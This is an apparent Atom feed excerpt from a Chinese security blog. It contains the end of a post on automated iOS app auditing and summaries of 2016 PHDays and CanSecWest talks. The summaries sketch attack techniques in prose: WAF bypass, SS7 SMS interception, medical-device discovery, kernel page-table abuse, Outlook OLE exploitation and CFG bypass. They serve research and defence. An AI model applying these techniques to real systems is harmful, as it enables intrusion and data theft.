&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/15.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图15：iOS病毒TinyV的私有API检测结果&lt;br&gt;&lt;/center&gt;

&lt;h3 id=&quot;第三方库检测&quot;&gt;&lt;a href=&quot;#第三方库检测&quot; class=&quot;headerlink&quot; title=&quot;第三方库检测&quot;&gt;&lt;/a&gt;第三方库检测&lt;/h3&gt;&lt;p&gt;有时外界会曝光一些第三方开源库的漏洞，影响经常是跨平台的，包括iOS应用。因此我们专门收集上百个常用第三方库信息作为检测内容，在日常审计应用时，能够维护一份哪些公司产品使用到哪些第三方库的信息【图16】，在外部曝光漏洞后，我们可以快速定位受影响的产品及危害范围。&lt;/p&gt;
&lt;p&gt;不过目前缺乏相应的版本信息，因为有些库编译出来后是不带版本字符串，需要针对不同版本作指纹库检测，也是个不少工程量，如果业界有好心人愿意造服群众的话，可以试试做个第三方库的指纹库出来。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/16.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图16：第三方库检测&lt;br&gt;&lt;/center&gt;

&lt;h3 id=&quot;开放端口检测&quot;&gt;&lt;a href=&quot;#开放端口检测&quot; class=&quot;headerlink&quot; title=&quot;开放端口检测&quot;&gt;&lt;/a&gt;开放端口检测&lt;/h3&gt;&lt;p&gt;之所以做开放端口检测这个功能，主要是基于此前曝光的“WormHole”漏洞，此类因开放端口导致的安全漏洞，在Android应用上已经有过不少案例，搜索乌云就能找到。&lt;/p&gt;
&lt;p&gt;检测开放端口其实一条命令就足够了，然后定期轮循即可：&lt;br&gt;lsof -i | grep ‘“+appname+”‘ | awk ‘{print $1,$8,$9,$10}’&lt;/p&gt;
&lt;p&gt;直接上效果图，如【图17】所示：&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/17.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图17：开放端口审计&lt;br&gt;&lt;/center&gt;

&lt;h3 id=&quot;审计效果&quot;&gt;&lt;a href=&quot;#审计效果&quot; class=&quot;headerlink&quot; title=&quot;审计效果&quot;&gt;&lt;/a&gt;审计效果&lt;/h3&gt;&lt;p&gt;我们随机抽取了公司60款iOS应用，审计后共发现10款产品存在中高危漏洞【图18】，其中主要是SSL中间人漏洞和授权密钥泄露漏洞居多。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/18.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图18：审计结果&lt;br&gt;&lt;/center&gt;

&lt;h3 id=&quot;后记&quot;&gt;&lt;a href=&quot;#后记&quot; class=&quot;headerlink&quot; title=&quot;后记&quot;&gt;&lt;/a&gt;后记&lt;/h3&gt;&lt;p&gt;本文主要针对笔者在开发iOS应用自动审计系统时运用的一些技术作个分享，希望能起到抛砖引玉的作用。系统本身也还有一些有待完善的地方，欢迎各位业界同仁共同交流探讨。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;此前有人统计过2015年漏洞最多的产品，苹果的OSX与iOS系统分别占据第一二名，虽有人怀疑统计数据可能存在重复的不准确情况，但相信大趋势是不会变的。&lt;/p&gt;
&lt;p&gt;2015年在iOS平台上也发生过不少安全大事，比如“XcodeGhost”事件、iOS9越狱、“iBackDoor“、“YouMi“事件等等，尤其是XcodeGhost影响甚大，注定要在iOS安全史上留下重重的一笔。&lt;/p&gt;
&lt;p&gt;结合CVEDetails站点上对iOS系统漏洞的统计情况【图1】，整体处于上升的趋势，尤其是2015年增长迅速，是2014年的3倍多，由此也可以预见iOS平台上的安全漏洞正在快速增长，iOS应用亦然。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/1.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图1：iOS系统历年漏洞数量统计图&lt;br&gt;&lt;/center&gt;
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="安全审计" scheme="http://riusksk.github.io/tags/%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="iOS" scheme="http://riusksk.github.io/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>迁移技术文章</title>
    <link href="http://riusksk.github.io/2016/06/17/add-articles/"/>
    <id>http://riusksk.github.io/2016/06/17/add-articles/</id>
    <published>2016-06-17T08:11:06.000Z</published>
    <updated>2016-06-17T08:24:10.000Z</updated>
    
    <content type="html">&lt;p&gt;由于博客大巴体验太差，因此开始启用github去写博客，用markdown+hexo写静态博客的感觉也挺好的，而且更安全。&lt;br&gt;后面我会把以前写的技术文章迁移到本博客，顺便把买来很久一直未用的riusksk.me域名给派上用场了，之前是因为备案流程过于繁琐，才导致一直未使用，使用 &lt;a href=&quot;http://riusksk.me&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://riusksk.me&lt;/a&gt; 解析到 &lt;a href=&quot;http://riusksk.github.io&quot;&gt;http://riusksk.github.io&lt;/a&gt; ，似乎就不用备案了。&lt;br&gt;近日，我已在本博客上添加RSS订阅和评论功能，欢迎大家订阅和交流。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;由于博客大巴体验太差，因此开始启用github去写博客，用markdown+hexo写静态博客的感觉也挺好的，而且更安全。&lt;br&gt;后面我会把以前写的技术文章迁移到本博客，顺便把买来很久一直未用的riusksk.me域名给派上用场了，之前是因为备案流程过于繁琐，才导致一直未使
    
    </summary>
    
      <category term="随笔杂谈" scheme="http://riusksk.github.io/categories/%E9%9A%8F%E7%AC%94%E6%9D%82%E8%B0%88/"/>
    
    
  </entry>
  
  <entry>
    <title>PHDays安全大会议题分析</title>
    <link href="http://riusksk.github.io/2016/05/25/PHDays-2016/"/>
    <id>http://riusksk.github.io/2016/05/25/PHDays-2016/</id>
    <published>2016-05-25T02:09:17.000Z</published>
    <updated>2016-06-24T14:47:33.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;大会简介&quot;&gt;&lt;a href=&quot;#大会简介&quot; class=&quot;headerlink&quot; title=&quot;大会简介&quot;&gt;&lt;/a&gt;大会简介&lt;/h2&gt;&lt;p&gt;PHDays（Positive Hack Days）,俄罗斯著名的黑客大会，内容涵盖硬件安全、WEB安全、移动安全、网络安全等诸多专业安全领域，并且会议期间设有CTF夺旗竞技赛。&lt;/p&gt;
&lt;p&gt;今年会议主要围绕以下主题：关键信息系统的安全性、欺诈管理、网络犯罪和事故调查、维基解密时代的政府与企业安全、网络战和网络间谍。同时，还设有安全论坛，云计算和虚拟基础设施的保护，0day攻防、DDOS防御、工控安全、业务应用和通信网络安全。&lt;/p&gt;
&lt;h2 id=&quot;议题分析&quot;&gt;&lt;a href=&quot;#议题分析&quot; class=&quot;headerlink&quot; title=&quot;议题分析&quot;&gt;&lt;/a&gt;议题分析&lt;/h2&gt;&lt;p&gt;关于大会议题的在线视频参见：&lt;a href=&quot;http://www.phdays.com/broadcast/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.phdays.com/broadcast/&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;1、《Building-Honeypots-to-Monitor-DDoS》&quot;&gt;&lt;a href=&quot;#1、《Building-Honeypots-to-Monitor-DDoS》&quot; class=&quot;headerlink&quot; title=&quot;1、《Building Honeypots to Monitor DDoS》&quot;&gt;&lt;/a&gt;1、《Building Honeypots to Monitor DDoS》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14641421571387/14641437211481.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;作者通过搭建存在DDoS漏洞服务的网络蜜罐，从互联网中提取可视化信息，然后将数据反馈给ELK（Elasticsearch、Logstash、Kibana日志集中分析平台，为保护真实网络财产的系统提供数据支撑。据说，后面作者会开源一个网络管理系统，用于统计外部网络的一些反射DDoS攻击的数据。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;2、《Waf-js：How-to-Protect-Web-Applications-using-JavaScript》&quot;&gt;&lt;a href=&quot;#2、《Waf-js：How-to-Protect-Web-Applications-using-JavaScript》&quot; class=&quot;headerlink&quot; title=&quot;2、《Waf.js：How to Protect Web Applications using JavaScript》&quot;&gt;&lt;/a&gt;2、《Waf.js：How to Protect Web Applications using JavaScript》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14641421571387/14641534353049.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;使用Javascript代码去防御DOM XSS、CSRF、点击劫持，以及其它攻击环境检测（Beef、Xbackdoor、Acunetix等等）的工具，与Server组使用js防御dom xss的思路类似，只是多了其它几项功能。文档下载：&lt;a href=&quot;http://www.slideshare.net/DenisKolegov/wafjs-how-to-protect-web-applications-using-javascript&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.slideshare.net/DenisKolegov/wafjs-how-to-protect-web-applications-using-javascript&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;3、《Scalable-and-Effective-Fuzzing-of-Google-Chrome-Browser》&quot;&gt;&lt;a href=&quot;#3、《Scalable-and-Effective-Fuzzing-of-Google-Chrome-Browser》&quot; class=&quot;headerlink&quot; title=&quot;3、《Scalable and Effective Fuzzing of Google Chrome Browser》&quot;&gt;&lt;/a&gt;3、《Scalable and Effective Fuzzing of Google Chrome Browser》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14641421571387/14641573779613.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;介绍Google的分布式Fuzzing系统——CluterFuzz，采用集群服务器进行分布式Fuzzing，大概4000多台机器，不排除使用虚拟机的情况。议题介绍了一些Fuzz变异算法、漏洞类型识别、代码覆盖率问题、自动化精简样本，以及各种sanitizers功能的使用，比较常用的还是Address Sanitizer，且各平台通用。&lt;/p&gt;
&lt;h3 id=&quot;4、《Web-Application-Firewall-Bypassing》&quot;&gt;&lt;a href=&quot;#4、《Web-Application-Firewall-Bypassing》&quot; class=&quot;headerlink&quot; title=&quot;4、《Web Application Firewall Bypassing》&quot;&gt;&lt;/a&gt;4、《Web Application Firewall Bypassing》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14641421571387/14641659037475.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;总结绕过AWF的三大策略：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;1、预处理利用&lt;/strong&gt;：即设法绕过WAF的输入验证，比如HTTP头（X-Originating-IP、X-Forwarded-For、X-Remote-IP、X-Remote-Addr）的处理，就曾多次被用于绕过公司WAF的SQL注入防护，或者HTTP方法头GET/POST的篡改、换行符的处理等等方式；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2、致阻断失配&lt;/strong&gt;：利用前后端数据处理的差异，使得无法匹配到黑名单里的规则，通常结合一些参数污染、字符编码、注释符等多种方式绕过；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;3、规则集绕过&lt;/strong&gt;：通过暴力枚举出WAF的拦截规则，或者逆向WAF程序获取规则，然后再设法绕过。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;5、《Mobile-Communications-are-Insecure-Evidence-Based-Arguments》&quot;&gt;&lt;a href=&quot;#5、《Mobile-Communications-are-Insecure-Evidence-Based-Arguments》&quot; class=&quot;headerlink&quot; title=&quot;5、《Mobile Communications are Insecure. Evidence-Based Arguments》&quot;&gt;&lt;/a&gt;5、《Mobile Communications are Insecure. Evidence-Based Arguments》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14641421571387/14642298519901.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;由于当前移动通讯网络采用许多过旧技术，导致一些漏洞遗留其中，主要是针对SS7第7号信令系统的漏洞情况进行统计，其中主要三大威胁是：拒绝服务、信息泄露（比如短信、通话内容、IMEI、地理位置等等）、欺诈。并现场演示短信窃取，实现社交帐号的盗取，并成功获取历史聊天记录。&lt;/p&gt;
&lt;h3 id=&quot;6、《Fingerprinting-and-Attacking-a-Healthcare-Infrastructure》&quot;&gt;&lt;a href=&quot;#6、《Fingerprinting-and-Attacking-a-Healthcare-Infrastructure》&quot; class=&quot;headerlink&quot; title=&quot;6、《Fingerprinting and Attacking a Healthcare Infrastructure》&quot;&gt;&lt;/a&gt;6、《Fingerprinting and Attacking a Healthcare Infrastructure》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14641421571387/14642478498497.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;作者分享了一些关于医疗设备攻击的思路，比如通过网络空间搜索引擎Shodan/Censys/Maltego去查找网络上的医疗设备，介绍如何通过设备指纹去查找医疗设备，目前很多医疗设备存在允许未授权的访问，特别容易导致敏感信息泄露，甚至允许远程操作医疗设备，可能影响到患者的健康问题，最后他提供一些针对医疗设备攻击的防御方案。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;大会简介&quot;&gt;&lt;a href=&quot;#大会简介&quot; class=&quot;headerlink&quot; title=&quot;大会简介&quot;&gt;&lt;/a&gt;大会简介&lt;/h2&gt;&lt;p&gt;PHDays（Positive Hack Days）,俄罗斯著名的黑客大会，内容涵盖硬件安全、WEB安全、移动安全、网络安全等诸多专业安全领域，并且会议期间设有CTF夺旗竞技赛。&lt;/p&gt;
&lt;p&gt;今年会议主要围绕以下主题：关键信息系统的安全性、欺诈管理、网络犯罪和事故调查、维基解密时代的政府与企业安全、网络战和网络间谍。同时，还设有安全论坛，云计算和虚拟基础设施的保护，0day攻防、DDOS防御、工控安全、业务应用和通信网络安全。&lt;/p&gt;
&lt;h2 id=&quot;议题分析&quot;&gt;&lt;a href=&quot;#议题分析&quot; class=&quot;headerlink&quot; title=&quot;议题分析&quot;&gt;&lt;/a&gt;议题分析&lt;/h2&gt;&lt;p&gt;关于大会议题的在线视频参见：&lt;a href=&quot;http://www.phdays.com/broadcast/&quot;&gt;http://www.phdays.com/broadcast/&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;1、《Building-Honeypots-to-Monitor-DDoS》&quot;&gt;&lt;a href=&quot;#1、《Building-Honeypots-to-Monitor-DDoS》&quot; class=&quot;headerlink&quot; title=&quot;1、《Building Honeypots to Monitor DDoS》&quot;&gt;&lt;/a&gt;1、《Building Honeypots to Monitor DDoS》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14641421571387/14641437211481.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;作者通过搭建存在DDoS漏洞服务的网络蜜罐，从互联网中提取可视化信息，然后将数据反馈给ELK（Elasticsearch、Logstash、Kibana日志集中分析平台，为保护真实网络财产的系统提供数据支撑。据说，后面作者会开源一个网络管理系统，用于统计外部网络的一些反射DDoS攻击的数据。&lt;br&gt;
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="PHDays" scheme="http://riusksk.github.io/tags/PHDays/"/>
    
  </entry>
  
  <entry>
    <title>CanSecWest 2016 大会议题分析</title>
    <link href="http://riusksk.github.io/2016/04/13/CanSecWest_2016/"/>
    <id>http://riusksk.github.io/2016/04/13/CanSecWest_2016/</id>
    <published>2016-04-13T03:47:32.000Z</published>
    <updated>2016-06-24T14:48:30.000Z</updated>
    
    <content type="html">&lt;p&gt;本周分析的安全大会主要以2016年CanSecWest黑客大会上的精彩议题为主，整体上，议题主要偏向于&lt;strong&gt;系统/软件漏洞挖掘与利用技术&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;各议题下载链接参见：&lt;a href=&quot;http://www.slideshare.net/CanSecWest/presentations&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.slideshare.net/CanSecWest/presentations&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;1、《Sandbox-Escape-with-Generous-Help-from-Security-Software》&quot;&gt;&lt;a href=&quot;#1、《Sandbox-Escape-with-Generous-Help-from-Security-Software》&quot; class=&quot;headerlink&quot; title=&quot;1、《Sandbox Escape with Generous Help from Security Software》&quot;&gt;&lt;/a&gt;1、《Sandbox Escape with Generous Help from Security Software》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14605295530449.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;腾讯玄武实验室分享的杀毒软件漏洞挖掘技巧，比如BitDefender、Comodo、Avast、Kaspersky等等国外知名杀软厂商，大多是一些敏感功能未鉴权导致的代码执行或者信息泄露的问题，比如攻击者伪造IO请求去读写、执行本地文件。这里比较好的一点是在漏洞利用场景上，他们将杀软漏洞用来绕过沙盒保护，因为杀软漏洞可以直接以System最高权限执行，允许直接关闭一些软件的沙盒防护。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h3 id=&quot;2、《Don’t-Trust-Your-Eye-Apple-Graphics-Is-Compromised》&quot;&gt;&lt;a href=&quot;#2、《Don’t-Trust-Your-Eye-Apple-Graphics-Is-Compromised》&quot; class=&quot;headerlink&quot; title=&quot;2、《Don’t Trust Your Eye-  Apple Graphics Is Compromised》&quot;&gt;&lt;/a&gt;2、《Don’t Trust Your Eye-  Apple Graphics Is Compromised》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14605302948646.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;腾讯科恩实验室分享的关于OSX/iOS内核驱动漏洞挖掘的方法，主要介绍了两种Fuzzing策略：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;被动Fuzzing&lt;/strong&gt;：&lt;strong&gt;通过Hook IOKit API（IOConnectMapMemory/IOConnectUnmapMemory/IOConnectCallMethod/IOConnectCallScalarMethod），随机变异参数值&lt;/strong&gt;；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;主动Fuzzing&lt;/strong&gt;：&lt;strong&gt;通过脚本自动提取驱动的接口函数与参数信息，然后发送畸形数据去调用&lt;/strong&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最后列举一个竞争条件漏洞实例，介绍漏洞成因与利用方法。&lt;/p&gt;
&lt;h3 id=&quot;3、《Automatic-Binary-Constraint-Solving-Automatic-Exploit-Generation》&quot;&gt;&lt;a href=&quot;#3、《Automatic-Binary-Constraint-Solving-Automatic-Exploit-Generation》&quot; class=&quot;headerlink&quot; title=&quot;3、《Automatic Binary Constraint Solving: Automatic Exploit Generation》&quot;&gt;&lt;/a&gt;3、《Automatic Binary Constraint Solving: Automatic Exploit Generation》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14605312840771.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;分享自动生成利用代码的工具AEG，主要针对混合读写操作导致的漏洞，通过PIN进行指令插桩，利用符号执行（Symbolic Execution）和混合执行（Concolic Execution）一块去实现程序的动态分析与利用代码生成。&lt;br&gt;&lt;strong&gt;PS：整体思路跟以往挖掘漏洞中用于分析代码执行路径，增加代码覆盖率的思路一致，用在漏洞挖掘与分析上比较可行，但自动生成利用代码估计效果不好。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;4、《Pwn-a-Nexus-device-with-a-single-vulnerability》&quot;&gt;&lt;a href=&quot;#4、《Pwn-a-Nexus-device-with-a-single-vulnerability》&quot; class=&quot;headerlink&quot; title=&quot;4、《Pwn a Nexus device with a single vulnerability》&quot;&gt;&lt;/a&gt;4、《Pwn a Nexus device with a single vulnerability》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14605317938560.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;来自360的分享，是其在Pwn2Own Mobile 2015上用于攻破Nexus手机的chrome浏览器漏洞CVE-2015-6764。议题对该漏洞的成因、利用和补丁代码都进行了分析，是一个越界访问漏洞，通过越界读写内存造成地址泄露，从而再绕过ASLR。该议题提到的利用方式（&lt;strong&gt;RCE2UXSS、UXSS2RCE&lt;/strong&gt;）比较奇妙,在利用漏洞获取执行代码的权限后，&lt;strong&gt;通过hook ScriptLoader::executeScript去注入Javascript代码，然后在 &lt;a href=&quot;https://play.goolge.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://play.goolge.com&lt;/a&gt; 域下通过JS去安装任意APP&lt;/strong&gt;。&lt;/p&gt;
&lt;h3 id=&quot;5、《BadWinmail-and-Email-Security-on-Outlook》&quot;&gt;&lt;a href=&quot;#5、《BadWinmail-and-Email-Security-on-Outlook》&quot; class=&quot;headerlink&quot; title=&quot;5、《BadWinmail and Email Security on Outlook》&quot;&gt;&lt;/a&gt;5、《BadWinmail and Email Security on Outlook》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14605992256618.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;在msg文件格式中嵌入OLE对象，然后更改CLSID为Flash控件或者PDF控件，利用这些控件的漏洞直接实现利用。另外还可传输不确定封装格式 (TNEF，附件名为winmail.dat) ，它也支持OLE，然后采用上述相同攻击方法实现利用。用户在使用Outlook打开上述邮件时即可直接执行任意代码。&lt;/p&gt;
&lt;h3 id=&quot;6、《Getting-Physical-Extreme-abuse-of-Intel-based-Paging-Systems》&quot;&gt;&lt;a href=&quot;#6、《Getting-Physical-Extreme-abuse-of-Intel-based-Paging-Systems》&quot; class=&quot;headerlink&quot; title=&quot;6、《Getting Physical Extreme abuse of Intel based Paging Systems》&quot;&gt;&lt;/a&gt;6、《Getting Physical Extreme abuse of Intel based Paging Systems》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14606052304309.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;讲述利用操作系统的分页机制去绕过各种内核安全机制，比如DEP、KASLR、NULL解引用保护、SMEP等等，主要针对Linux与Windows，并提供有demo代码。传统方法可能更多的是借助信息泄露漏洞，利用泄露地址去绕过上述保护，利用他们提供的方法甚至可允许非特权用户dump到内核访问的物理内存。主要利用以下缺陷：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;分页表位于固定虚拟地址（Windows）；&lt;/li&gt;
&lt;li&gt;分页表可写(Windows);&lt;/li&gt;
&lt;li&gt;PDPTs、PDs与PTs位于固定虚拟地址（Linux）;&lt;/li&gt;
&lt;li&gt;分页结构可写（Linux)。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;比如Windows上，可以利用任意写地址漏洞去将PTE分页表（固定地址）中的指针修改为HAL堆上的物理内存地址,HAL堆上包含有一堆函数指针，包括hal!HalpApicRequestInterrupt函数，最后结合ROP就可以禁用SMEP保护，最终获得系统权限。还有其它页目录堆喷的利用方式，Linux上稍有不同，但攻击思路类似。&lt;/p&gt;
&lt;h3 id=&quot;7、《Execute-My-Packet-Exodus-of-Shells-from-a-Firewall-》&quot;&gt;&lt;a href=&quot;#7、《Execute-My-Packet-Exodus-of-Shells-from-a-Firewall-》&quot; class=&quot;headerlink&quot; title=&quot;7、《Execute My Packet (Exodus of Shells from a Firewall)》&quot;&gt;&lt;/a&gt;7、《Execute My Packet (Exodus of Shells from a Firewall)》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14606157550780.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Cisco ASA Adaptive Security Appliance是个IP路由器，具备防火墙、反病毒、入侵检测和VPN服务器的功能，它的IKE(网络密钥交换)版本v1和v2存在堆溢出漏洞（CVE-2016-1287），利用漏洞允许未授权的用户实现远程代码执行。该议题分析了导致漏洞的成因以及利用方法，目前官方已修复此漏洞。&lt;/p&gt;
&lt;h3 id=&quot;8、《Bypassing-Different-Defense-Schemes-via-Crash-Resistant-Probing-of-Address-Space》&quot;&gt;&lt;a href=&quot;#8、《Bypassing-Different-Defense-Schemes-via-Crash-Resistant-Probing-of-Address-Space》&quot; class=&quot;headerlink&quot; title=&quot;8、《Bypassing Different Defense Schemes via Crash-Resistant Probing of Address Space》&quot;&gt;&lt;/a&gt;8、《Bypassing Different Defense Schemes via Crash-Resistant Probing of Address Space》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14606192691752.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;作者在不借助地址泄露的情况下，使用“崩溃恢复”（Crash-Resistant）功能去绕过DEP、ASLR、CFG等多个安全机制。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;通过内存扫描获取地址&lt;/strong&gt;：结合堆喷射，利用漏洞篡改数据类型相关（比如整数）的1个字节，从而伪造出JS对象，接着在web worker中使用setInerval函数去使用伪造的JS对象，这里使用setInerval是为了使用Crash-Resistant功能，有了JS对象就有了可控的虚表指针，再通过扫描内存获取TEB（线程环境块）基址、DLL基址等信息。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;创建Blob对象来绕过EAF+&lt;/strong&gt;：另外还演示了如何绕过EMEt 5.5 的EAF和EAF+保护，作者通过创建Blob对象来解决，因为它会调用到未在EAF+黑名单里面的ntdll模块，进而解决导出表的安全限制问题。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;利用函数链（Function Chaining）绕过CFG&lt;/strong&gt;：在控制虚表函数指针后，利用5个未被EMET禁用的导出函数（利用networkx 和miasm2工具去搜索的），依次调用组成一个函数调用链，最终调用LdrInitShimEngineDynamic([fakeStr + 0x8] + 0x20, [fakeStr] + 0x18)，这里的两个参数都是可控的，从而实现任意DLL的加载。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;9、《Virtualization-Device-Emulator-Testing-Technology》&quot;&gt;&lt;a href=&quot;#9、《Virtualization-Device-Emulator-Testing-Technology》&quot; class=&quot;headerlink&quot; title=&quot;9、《Virtualization Device Emulator Testing Technology》&quot;&gt;&lt;/a&gt;9、《Virtualization Device Emulator Testing Technology》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14606253312145.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;通过分析虚拟设备模拟器的攻击面，主要针对各个硬件虚拟组件进行Fuzzing，通过系统hook模块去获取各个设备模拟器，然后从服务端向各个模拟器客户端发送畸形数据，再根据客户端返回的日志进行分析。&lt;/p&gt;
&lt;h3 id=&quot;10、《Hardsploit-project-All-In-One-Tool-for-Hardware-Security-Audit》&quot;&gt;&lt;a href=&quot;#10、《Hardsploit-project-All-In-One-Tool-for-Hardware-Security-Audit》&quot; class=&quot;headerlink&quot; title=&quot;10、《Hardsploit project : All-In-One Tool for Hardware Security Audit》&quot;&gt;&lt;/a&gt;10、《Hardsploit project : All-In-One Tool for Hardware Security Audit》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14606908008051.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Hardsploit项目是一个硬件安全审计框架，支持多种硬件接口，比如I2C, JTAG, SPI, PARALLEL, UART，主要应用在物联网产品的安全审计上。通过工具可以提取存储在芯片上各种数据，读写以及嗅探传输数据，便于后续作分析，而且还提供有界面、API接口等等功能。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;本周分析的安全大会主要以2016年CanSecWest黑客大会上的精彩议题为主，整体上，议题主要偏向于&lt;strong&gt;系统/软件漏洞挖掘与利用技术&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;各议题下载链接参见：&lt;a href=&quot;http://www.slideshare.net/CanSecWest/presentations&quot;&gt;http://www.slideshare.net/CanSecWest/presentations&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;1、《Sandbox-Escape-with-Generous-Help-from-Security-Software》&quot;&gt;&lt;a href=&quot;#1、《Sandbox-Escape-with-Generous-Help-from-Security-Software》&quot; class=&quot;headerlink&quot; title=&quot;1、《Sandbox Escape with Generous Help from Security Software》&quot;&gt;&lt;/a&gt;1、《Sandbox Escape with Generous Help from Security Software》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/14605192523708/14605295530449.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;腾讯玄武实验室分享的杀毒软件漏洞挖掘技巧，比如BitDefender、Comodo、Avast、Kaspersky等等国外知名杀软厂商，大多是一些敏感功能未鉴权导致的代码执行或者信息泄露的问题，比如攻击者伪造IO请求去读写、执行本地文件。这里比较好的一点是在漏洞利用场景上，他们将杀软漏洞用来绕过沙盒保护，因为杀软漏洞可以直接以System最高权限执行，允许直接关闭一些软件的沙盒防护。&lt;/p&gt;
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="CanSecWest" scheme="http://riusksk.github.io/tags/CanSecWest/"/>
    
  </entry>
  
  <entry>
    <title>BlackHat Asia 2016 大会议题分析报告</title>
    <link href="http://riusksk.github.io/2016/04/05/bh-asia-2016/"/>
    <id>http://riusksk.github.io/2016/04/05/bh-asia-2016/</id>
    <published>2016-04-05T02:27:11.000Z</published>
    <updated>2016-06-24T14:48:46.000Z</updated>
    
